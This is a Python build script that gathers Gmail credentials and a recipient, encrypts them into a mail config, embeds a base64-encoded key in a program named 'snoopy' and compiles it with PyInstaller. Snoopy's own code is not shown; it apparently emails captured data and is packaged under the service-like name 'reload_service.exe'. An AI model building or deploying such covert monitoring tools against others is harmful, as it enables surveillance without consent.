#!/usr/bin/env python

import getpass
import base64
import sys
import shutil
import re
import os
import subprocess
_directory = os.path.dirname(os.path.abspath(__file__))
parentdir = os.path.dirname(_directory)
os.sys.path.insert(0, parentdir)
from lib.secrets_manager import SecretsManager

mail_config          = 'mail.config'


def replace_tokens(string, tokens, filename):
    '''replaces the tokens and creates a new file'''
    for key, value in tokens.items():
        string = string.replace(key, value)
    original_filename = "ORIGINAL_{}".format(filename)
    shutil.copy(filename, original_filename)
    with open(filename, 'w') as f:
        f.write(string)


def extract_value(string):
    return string.split(":")[1].strip()


def load_inputs(filename):
    config = {}
    config_str = ""
    with open(filename, 'r') as f:
        config_str = f.read()
    lines = config_str.split("\n")
    for line in lines:
        if line.startswith('user'):
            config['user'] = extract_value(line)
        elif line.startswith('pwd'):
            config['pwd'] = extract_value(line)
        elif line.startswith('recipient'):
            config['recipient'] = extract_value(line)
        elif line.startswith('device'):
            config['device'] = extract_value(line)
        elif line.startswith('token'):
            config['token'] = extract_value(line)
    return config


def purge(directory, pattern):
    for f in os.listdir(directory):
        if re.search(pattern, f):
            os.remove(os.path.join(directory, f))


def ensure_clean_directory():
    shutil.rmtree("./build", ignore_errors=True)
    shutil.rmtree("./dist", ignore_errors=True)
    shutil.rmtree("./__pycache__", ignore_errors=True)
    purge(parentdir, "^ORIGINAL_.*")
    purge(parentdir, ".*png$")
    purge(parentdir, ".*log$")
    purge(parentdir, ".*out$")
    purge(parentdir, "reload_service.exe")
    purge(parentdir, "reload_service.obj")


def prepare_file(filename, tokens):
    string = ""
    with open(filename, 'r') as f:
        string = f.read()
    replace_tokens(string, tokens, filename)


class Helper:
    def __init__(self):
        ensure_clean_directory()
        self.secret_key = None

    def create_config(self):
        inputs = {}
        # you can pass a mail.config filename to be faster
        if len(sys.argv) > 1:
            inputs = load_inputs(sys.argv[1])
        else:
            # accept username, password, recipient, device, token
            inputs['user'] = input("gmail username: ")
            inputs['pwd'] = getpass.getpass("gmail password: ")
            inputs['recipient'] = input("recipient of emails: ")
            inputs['device'] = input("name of device: ")
            inputs['token'] = getpass.getpass("secure token: ")

        # create config
        config_str = ""
        for key, value in inputs.items():
            config_str += "{}:{}\n".format(key, value)

        # accept the secret encryption key
        self.secret_key = getpass.getpass("secret (should not equal token): ")

        print("preparing files...")

        # encrypt the mail config
        secrets_manager = SecretsManager(self.secret_key, mail_config)
        secrets_manager.put(config_str)

    def replace_tokens(self, program, spec):
        """must be called after create_config so that we have the secret key"""
        # embed key in copy of snoopy.py and replace installation directory
        if not self.secret_key:
            print("secret key not set -- did you call create_config first?")
            sys.exit(-1)
        encoded_secret = base64.b64encode(self.secret_key.encode()).decode()
        tokens = {
            "SUPER_SECRET_KEY": encoded_secret,
            "HOME_DIRECTORY": parentdir
        }
        prepare_file(program, tokens)

        # replace tokens in snoopy.spec
        tokens = {"HOME_DIRECTORY": parentdir}
        prepare_file(spec, tokens)

    def compile(self, filename):
        # compile snoopy.spec
        print("compiling snoopy...")
        subprocess.check_output(['pyinstaller', filename])

    def replace_originals(self, snoopy_filename, snoopy_spec_filename):
        # replace the new snoopy.py and spec with the originals
        print("replacing originals...")
        snoopy_original = 'ORIGINAL_{}'.format(snoopy_filename)
        spec_original = 'ORIGINAL_{}'.format(snoopy_spec_filename)
        shutil.copy(snoopy_original, snoopy_filename)
        shutil.copy(spec_original, snoopy_spec_filename)
        os.remove(snoopy_original)
        os.remove(spec_original)
